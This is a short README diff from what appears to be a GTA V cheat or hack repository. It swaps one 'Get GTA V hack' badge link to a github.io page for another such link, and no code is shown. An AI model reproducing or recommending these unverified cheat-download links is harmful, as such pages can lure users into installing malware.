@@ -4,11 +4,8 @@
   <img src="https://i.playground.ru/p/7dSaH93E7YzBvqVWm6ja0Q.png" width="820" alt="GTA V Key Art">
 </div>
 
-<p align="center">
-  <a href="http://gta-v-cheats-hacks.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_GTA_V_HACK-2F9CFF?style=for-the-badge&logo=rockstar-games&logoColor=white" alt="Get GTA V">
-  </a>
-</p>
+[![GET GTA V](https://img.shields.io/badge/GET%20%E2%80%94%20GTA-V-0078D6?style=for-the-badge&logoColor=white)](https://umarmk00100.github.io/.github/GTA-V)
+
 
 ---
 
